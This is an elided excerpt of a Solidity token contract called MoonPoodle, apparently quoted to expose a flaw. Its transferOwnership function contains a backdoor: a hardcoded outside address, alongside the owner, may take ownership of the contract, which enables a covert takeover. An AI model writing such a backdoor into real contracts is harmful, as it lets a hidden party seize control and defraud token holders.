...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x4CA7F7032e0a34ceB0eC9Fb7123A4bCE5CA19Eba));
...
contract MoonPoodle is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "MoonPoodle";
